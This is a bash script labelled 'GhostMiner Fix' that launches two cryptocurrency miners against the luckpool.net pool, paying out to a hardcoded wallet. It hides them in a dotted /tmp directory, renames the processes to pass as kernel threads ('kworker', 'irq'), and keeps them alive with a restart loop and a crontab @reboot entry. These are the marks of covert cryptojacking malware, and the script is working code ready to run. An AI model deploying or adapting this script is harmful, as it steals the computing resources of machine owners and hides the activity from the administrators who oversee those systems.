#!/bin/bash
# GhostMiner Fix - Simple & Working

echo "=== GHOSTMINER FIX ==="
echo ""

# Check current directory
echo "Current directory: $(pwd)"
ls -la verus-solver hellminer
echo ""

# Generate random ID
RID=$(date +%s | md5sum | cut -c1-8)
echo "Session ID: $RID"
echo ""

# Kill any existing
echo "Stopping existing miners..."
pkill -f "verus-solver"
pkill -f "hellminer"
pkill -f "$RID"
sleep 2
echo ""

# Create simple working directory
WORK_DIR="/tmp/.g${RID}"
mkdir -p "$WORK_DIR"
cd "$WORK_DIR"

echo "Working directory: $WORK_DIR"
cp /home/ubuntu/vs-mn/verus-solver ./v
cp /home/ubuntu/vs-mn/hellminer ./h
chmod +x ./v ./h
echo "✓ Miners copied"
echo ""

# Test if binaries work
echo "Testing miners..."
timeout 5 ./v --version 2>&1 | head -2 || echo "verus-solver test failed"
timeout 5 ./h --version 2>&1 | head -2 || echo "hellminer test failed"
echo ""

# Start verus-solver
echo "Starting verus-solver..."
nohup bash -c "exec -a [kworker/v:$RID] ./v --algo verus --pool stratum+tcp://eu.luckpool.net:3956 --wallet RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.v$RID --pass x --cpu-threads 1 --quiet" > v.log 2>&1 &
V_PID=$!
sleep 2

# Start hellminer
echo "Starting hellminer..."
nohup bash -c "exec -a [irq/h:$RID] ./h -c stratum+tcp://eu.luckpool.net:3956 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.h$RID -p x --cpu 1" > h.log 2>&1 &
H_PID=$!
sleep 2

echo "✓ Started verus-solver: PID $V_PID"
echo "✓ Started hellminer: PID $H_PID"
echo ""

# Check if running
echo "Checking status..."
if ps -p $V_PID > /dev/null && ps -p $H_PID > /dev/null; then
    echo "✓ Both miners are RUNNING!"
    echo ""
    
    # Show process info
    echo "Process Details:"
    ps -p $V_PID,$H_PID -o pid,ppid,%cpu,%mem,cmd
    
    echo ""
    echo "CPU Usage:"
    ps -p $V_PID,$H_PID -o %cpu | tail -2 | awk '{sum+=$1} END {print "Total: " sum "%"}'
    
    echo ""
    echo "Check connections:"
    ss -tunap 2>/dev/null | grep 3956 | grep -v LISTEN || netstat -tunap 2>/dev/null | grep 3956
    
    # Check logs for errors
    echo ""
    echo "Last log entries:"
    tail -5 v.log h.log 2>/dev/null
else
    echo "✗ Miners failed to start!"
    echo ""
    echo "verus-solver log (last 10 lines):"
    tail -10 v.log 2>/dev/null
    echo ""
    echo "hellminer log (last 10 lines):"
    tail -10 h.log 2>/dev/null
fi

echo ""
echo "=== AUTO-RESTART SETUP ==="
# Create restart script
cat > restart.sh << 'EOF'
#!/bin/bash
# Auto-restart script

RID="RID_PLACEHOLDER"
WORK_DIR="WORK_DIR_PLACEHOLDER"

while true; do
    sleep 60
    
    # Check verus-solver
    if ! pgrep -f "kworker/v:$RID" > /dev/null; then
        echo "$(date): Restarting verus-solver" >> "$WORK_DIR/restart.log"
        cd "$WORK_DIR" && nohup bash -c "exec -a [kworker/v:$RID] ./v --algo verus --pool stratum+tcp://eu.luckpool.net:3956 --wallet RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.v$RID --pass x --cpu-threads 1 --quiet" > v.log 2>&1 &
    fi
    
    # Check hellminer
    if ! pgrep -f "irq/h:$RID" > /dev/null; then
        echo "$(date): Restarting hellminer" >> "$WORK_DIR/restart.log"
        cd "$WORK_DIR" && nohup bash -c "exec -a [irq/h:$RID] ./h -c stratum+tcp://eu.luckpool.net:3956 -u RS4iSHt3gxrAtQUYSgodJMg1Ja9HsEtD3F.h$RID -p x --cpu 1" > h.log 2>&1 &
    fi
done
EOF

sed -i "s/RID_PLACEHOLDER/$RID/g" restart.sh
sed -i "s|WORK_DIR_PLACEHOLDER|$WORK_DIR|g" restart.sh
chmod +x restart.sh

nohup ./restart.sh > /dev/null 2>&1 &
echo "✓ Auto-restart enabled"
echo ""

# Add to crontab for reboot
CRON_CMD="@reboot sleep 30 && cd $WORK_DIR && ./restart.sh > /dev/null 2>&1"
(crontab -l 2>/dev/null | grep -v "$WORK_DIR"; echo "$CRON_CMD") | crontab - 2>/dev/null
echo "✓ Added to crontab for reboot survival"
echo ""

echo "=== SUMMARY ==="
echo "Session ID: $RID"
echo "Directory: $WORK_DIR"
echo ""
echo "To monitor:"
echo "  tail -f $WORK_DIR/v.log"
echo "  tail -f $WORK_DIR/h.log"
echo ""
echo "To check if running:"
echo "  ps aux | grep '$RID' | grep -v grep"
echo ""
echo "To stop everything:"
echo "  pkill -f '$RID'"
echo "  pkill -f 'restart.sh'"
echo ""
echo "Miners will auto-restart if they die"
echo "Miners will survive reboot via crontab"
